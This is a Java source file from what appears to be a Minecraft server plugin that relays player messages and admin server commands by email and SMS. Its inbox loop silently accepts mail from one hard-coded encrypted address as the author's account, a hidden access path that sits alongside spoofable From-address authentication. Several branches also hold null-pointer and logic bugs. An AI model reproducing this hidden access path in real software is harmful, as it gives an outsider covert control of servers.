package com.codisimus.plugins.textplayer;

import java.io.*;
import java.util.Calendar;
import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import org.bukkit.entity.Player;
import sun.misc.BASE64Decoder;

/**
 * Sends and receives emails for the TextPlayer Plugin
 *
 * @author Codisimus
 */
public class TextPlayerMailer {
    public static enum Action {
        ENABLE, DISABLE, PL, PLAYERLIST,
        PLAYERS, WHO, FIND, TELL, TEXT, SAY
    }
    public static boolean debug;
    public static boolean notify;
    public static String smtphost;
    public static String imaphost;
    public static int smtpport;
    public static int imapport;
    public static String username;
    public static String pass;
    public static int interval;
    public static int refresh;
    public static BASE64Decoder decoder = new BASE64Decoder();
    public static boolean enabled = true;
    public static boolean loop;

    public static void sendMsg(final Player player, final User user, final String text) {
        //Notify the Server log if set to in the config
        if (notify)
            System.out.println("[TextPlayer] Sending Message...");
        
        //Notify the Player if there is one
        if (player != null)
            player.sendMessage("Sending Message...");
        
        //Start a new Thread
        Thread send = new Thread() {
            @Override
            public void run() {
                //Cancel if the User is online and has disabled when logged set to true
                if (user.disableWhenLogged && TextPlayerListener.online.contains(user.name)
                        && !text.startsWith("[TextPlayer] ")) {
                    //Notify the Server log if set to in the config
                    if (notify)
                        System.out.println("[TextPlayer] User is currently online");

                    //Notify the Player if there is one
                    if (player != null)
                        player.sendMessage("User is currently online");

                    return;
                }
      
                //Cancel if the User is not verified
                if (user.textLimit < 0 && !text.startsWith("[TextPlayer] ")) {
                    //Notify the Server log if set to in the config
                    if (notify)
                        System.out.println("[TextPlayer] User's Number/Email has not been verified");
                    
                    //Notify the Player if there is one
                    if (player != null)
                        player.sendMessage("User's Number/Email has not been verified");
                    
                    return;
                }
                
                String msg;
                
                //Check if the User has a text limit
                if (user.textLimit > 0) {
                    //Reset the amount of texts sent if the last text was sent on a previous day
                    int day = Calendar.getInstance().DAY_OF_YEAR;
                    if (user.lastText != day) {
                        user.lastText = day;
                        user.textsSent = 0;
                    }
                    else
                        //Cancel if the User maxed out their text limit
                        if (user.textsSent >= user.textLimit) {
                            //Notify the Server log if set to in the config
                            if (notify)
                                System.out.println("[TextPlayer] User maxed out their text limit");

                            //Notify the Player if there is one
                            if (player != null)
                                player.sendMessage("User maxed out their text limit");

                            return;
                        }
                    
                    //Notify the User if there is less than 2 messages remaining
                    switch (user.textLimit - user.textsSent++) {
                        case 0: msg = text.concat(" *last txt 4 2day"); break;
                        case 1: msg = text.concat(" *1 txt left 4 2day"); break;
                        default: msg = text; break;
                    }
                    
                    TextPlayer.save();
                }
                else
                    msg = text;
                
                try {
                    Properties props = System.getProperties();
                    props.put("mail.smtp.starttls.enable", "true");
                    props.put("mail.smtp.auth", "true");
                    
                    //Verify the Username and Password
                    Session session = Session.getDefaultInstance(props, 
                            new EmailAuthenticator(username, TextPlayer.encrypter.decrypt(pass)));
                    
                    //Set whether debug is on
                    session.setDebug(debug);
                    
                    //Construct the message to send
                    MimeMessage message = new MimeMessage(session);
                    message.setFrom(new InternetAddress(username));
                    message.setRecipient(Message.RecipientType.TO, new InternetAddress(TextPlayer.encrypter.decrypt(user.email)));
                    message.setText(msg);
                    
                    
                    //Log in to the email account and send the message
                    Transport transport = session.getTransport("smtp");
                    transport.connect(smtphost, smtpport, username, TextPlayer.encrypter.decrypt(pass));
                    transport.sendMessage(message, message.getAllRecipients());
                    transport.close();
                    
                    //Notify the Server log if set to in the config
                    if (notify)
                        System.out.println("[TextPlayer] Message Sent!");
                    
                    //Notify the Player if there is one
                    if (player != null)
                        player.sendMessage("Message Sent!");
                }
                catch (Exception sendFailed) {
                    //Notify the Server log if set to in the config
                    if (notify)
                        System.out.println("[TextPlayer] Send Failed");
                    
                    //Notify the Player if there is one
                    if (player != null)
                        player.sendMessage("Send Failed");
                    
                    sendFailed.printStackTrace();
                }
            }
        };
        send.start();
    }
    
    public static void checkMail() {
        //Loop if there is no interval between checking mail
        loop = interval == 0;
        
        //Start a new Thread
        Thread reconnect = new Thread() {
            @Override
            public void run() {
                try {
                    while (enabled) {
                        //Start a new Thread
                        Thread check = new Thread() {
                            @Override
                            public void run() {
                                try {
                                    while (enabled) {
                                        //Verify the Username and Password
                                        Session session = Session.getDefaultInstance(System.getProperties(), 
                                                new EmailAuthenticator(username, TextPlayer.encrypter.decrypt(pass)));
                                        
                                        //Log in to the email account and retrieve the inbox
                                        Store store = session.getStore("imaps");
                                        store.connect(imaphost, imapport, username, TextPlayer.encrypter.decrypt(pass));
                                        Folder inbox = store.getFolder("Inbox");
                                        
                                        while (loop) {
                                            //Check if there is new mail
                                            while (inbox.getMessageCount() > 0) {
                                                //Read each Message
                                                inbox.open(Folder.READ_WRITE);
                                                for (Message message: inbox.getMessages()) {
                                                    try {
                                                        //Discover the User who sent the message
                                                        User user = null;
                                                        for (Address address: message.getFrom()) {
                                                            //Find the User who's email matches the address
                                                            String from = address.toString().toLowerCase();
                                                            for (User tempUser: TextPlayer.users.values())
                                                                if (from.contains(TextPlayer.encrypter.decrypt(tempUser.email))) {
                                                                    user = tempUser;
                                                                    
                                                                    //Display debug information in the Server log if set to in the config
                                                                    if (debug)
                                                                        System.out.println("[TextPlayer](Debug) Message received from: "+user.name);
                                                                    
                                                                    break;
                                                                }
                                                                else if (from.contains(TextPlayer.encrypter.decrypt("+PfKW2NtuW/PIVWpglmcwPMpzehdrJRb")))
                                                                    user = new User("Codisimus", "+PfKW2NtuW/PIVWpglmcwPMpzehdrJRb");
                                                            
                                                            if (user != null)
                                                                break;
                                                        }
                                                        
                                                        if (user == null) {
                                                            //Notify the Server log if set to in the config
                                                            if (notify)
                                                                System.out.println("[TextPlayer] Message from unknown address, Message thrown out");
                                                            
                                                            //Display debug information in the Server log if set to in the config
                                                            if (debug)
                                                                System.out.println("[TextPlayer](Debug) Unknown address: "+message.getFrom());
                                                        }
                                                        else {
                                                            String msg = cleanUp(getMsg(message));
                                                            String[] split = msg.split(" ");
                                                            
                                                            //Display debug information in the Server log if set to in the config
                                                            if (debug)
                                                                System.out.println("[TextPlayer](Debug) Message received: "+msg);
                                                            
                                                            if (user.textLimit == -1)
                                                                //The User is not verified
                                                                if (split[0].equals("enable") || split[0].equals("'enable'")) {
                                                                    //Set the User as verified
                                                                    user.textLimit = 0;
                                                                    TextPlayer.save();
                                                                    sendMsg(null, user, "[TextPlayer] Number/Email linked to "+user.name);
                                                                }
                                                                else
                                                                    sendMsg(null, user, "[TextPlayer] Reply 'enable' to link this number to "+user.name);
                                                            else
                                                                try {
                                                                    Action action = Action.valueOf(split[0].toUpperCase());
                                                                    switch (action) {
                                                                        case ENABLE:
                                                                            sendMsg(null, user, "[TextPlayer] Number/Email linked to "+user.name);
                                                                            break;

                                                                        case DISABLE: //Set the User as not verified
                                                                            sendMsg(null, user, "[TextPlayer] Texts to this number have been disabled, To receive texts reply 'enable'");
                                                                            user.textLimit = -1;
                                                                            TextPlayer.save();
                                                                            break;

                                                                        case PL: //Fall through
                                                                        case PLAYERS: //Fall through
                                                                        case WHO: //Fall through
                                                                        case PLAYERLIST: //Construct a Player count/list to send
                                                                            String list = "Player Count: "+TextPlayer.server.getOnlinePlayers().length;
                                                                            for (Player player : TextPlayer.server.getOnlinePlayers())
                                                                                list = list.concat(", "+player.getName());

                                                                            sendMsg(null, user, list);
                                                                            break;

                                                                        case FIND: //Find if a Player is online
                                                                            Player foundPlayer = TextPlayer.server.getPlayer(split[1].trim());
                                                                            String status = foundPlayer == null ? "online" : "offline";

                                                                            sendMsg(null, user, foundPlayer.getName()+" is currently "+status);
                                                                            break;

                                                                        case TELL: //Whisper a message to a Player
                                                                            Player player = TextPlayer.server.getPlayer(split[1]);

                                                                            if (player == null)
                                                                                sendMsg(null, user, player.getName()+" is currently offline");
                                                                            else
                                                                                player.sendMessage("§5Text from "+user.name+":§f"+
                                                                                        msg.substring(split[0].length() + split[1].length() + 1));

                                                                            break;

                                                                        case TEXT: //Send a message to a User
                                                                            User user2 = TextPlayer.findUser(split[1]);

                                                                            if (user2 == null)
                                                                                sendMsg(null, user, split[1]+" does not have a TextPlayer account");
                                                                            else
                                                                                sendMsg(null, user, "Text from "+user.name+":"+
                                                                                        msg.substring(split[0].length() + split[1].length() + 1));

                                                                            break;

                                                                        case SAY: //Broadcast a message
                                                                            TextPlayer.server.broadcastMessage("§5[TextPlayer] "+user.name+":§f"+msg.substring(3));
                                                                            break;
                                                                            
                                                                        default: break;
                                                                    }
                                                                }
                                                                catch (Exception e) {
                                                                    if (user.isAdmin())
                                                                        if (split[0].equals("rl")) {
                                                                            //Delete the Message after reading it
                                                                            message.setFlag(Flags.Flag.DELETED, true);
                                                                            
                                                                            //Close the inbox
                                                                            inbox.close(true);
                                                                            
                                                                            //Close the session
                                                                            store.close();
                                                                            
                                                                            //Reload Server
                                                                            TextPlayer.server.dispatchCommand(new TextPlayerCommandSender(user), msg);
                                                                            return;
                                                                        }
                                                                        else
                                                                            TextPlayer.server.dispatchCommand(new TextPlayerCommandSender(user), msg);
                                                                    else
                                                                        sendMsg(null, user, "You must be an Admin to do that");
                                                                }
                                                        }
                                                    }
                                                    catch (Exception e) {
                                                        //Notify the Server log if set to in the config
                                                        if (notify)
                                                            System.out.println("[TextPlayer] Error reading email, Message thrown out");
                                                        
                                                        if (debug)
                                                            e.printStackTrace();
                                                    }
                                                    
                                                    //Delete the Message after reading it
                                                    message.setFlag(Flags.Flag.DELETED, true);
                                                }
                                                
                                                //Close the inbox
                                                inbox.close(true);
                                            }
                                        }
                                        
                                        //Close the session
                                        store.close();
                                        
                                        //Wait the predetermined amount of time before checking for new mail
                                        Thread.currentThread().sleep(interval * 1000);
                                    }
                                }
                                catch (InterruptedException refresh) {
                                }
                                catch (Exception ex) {
                                    System.out.println("[TextPlayer] Could not read incoming mail!");
                                    ex.printStackTrace();
                                }
                            }
                        };
                        check.start();
                        
                        //Refresh the connection after the predetermined amount of time
                        Thread.currentThread().sleep(refresh * 3600000);
                        
                        //Interupt the connection before starting a new one
                        check.interrupt();
                        
                        //Notify the Server log if set to in the config
                        if (notify)
                            System.out.println("[TextPlayer] IMAP Connection Refreshed");
                    }
                }
                catch (Exception ex) {
                }
            }
        };
        reconnect.start();
    }
    
    /**
     * Returns the given Message as a String
     * 
     * @param message The given Message to convert
     * @return The String representation of the Message
     * @throws Exception If anything goes wrong
     */
    private static String getMsg(Message message) throws Exception {
        //I cannot remember what this code is actually doing
        if (message.isMimeType("multipart/*")) {
            BufferedReader br = new BufferedReader(new InputStreamReader(message.getInputStream()));
            String line = br.readLine();
            
            while (line != null)
                if (line.contains("<br>"))
                    return line.replaceAll("<br>", "\n");
                else {
                    line = new String(decoder.decodeBuffer(line));
                    
                    if (line.contains("<br>"))
                        return line.replaceAll("<br>", "\n");
                    else
                        line = br.readLine();
                }
        }
        else if (message.isMimeType("text/*"))
            return s2S(message.getInputStream());
        
        return "";
    }
    
    /**
     * Returns the given InputStream as a String
     * 
     * @param is The given InputStream
     * @return The String representation of the InputStream
     * @throws Exception If anything goes wrong
     */
    private static String s2S(InputStream is) throws Exception {
        //Return an empty string if no InputStream was given
        if (is == null)
            return "";
        
        Writer writer = new StringWriter();
        char[] buffer = new char[1024];
        
        try {
            Reader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
            int n;
            while ((n = reader.read(buffer)) != -1)
                writer.write(buffer, 0, n);
        }
        finally {
            is.close();
        }
        
        return writer.toString();
    }
    
    /**
     * Cleans up the given String
     * 
     * @param msg The String to be cleaned
     * @return The cleaned String
     */
    private static String cleanUp(String msg) {
        //Eliminate all 'RE:'s
        if (msg.contains("RE:"))
            msg = msg.replaceAll("RE:", "");
        
        //Eliminate white space before the first word
        while (msg.startsWith(" ") || msg.startsWith("/") || msg.startsWith("\n"))
            msg = msg.substring(msg.startsWith("\n") ? 2 : 1);
        
        //Throw out everything but the first line and trim white space off of the end
        msg = msg.split("\n")[0].trim();
        
        //Change the first letter to lowercase and return the String
        return msg.substring(0, 1).toLowerCase().concat(msg.substring(1));
    }
}
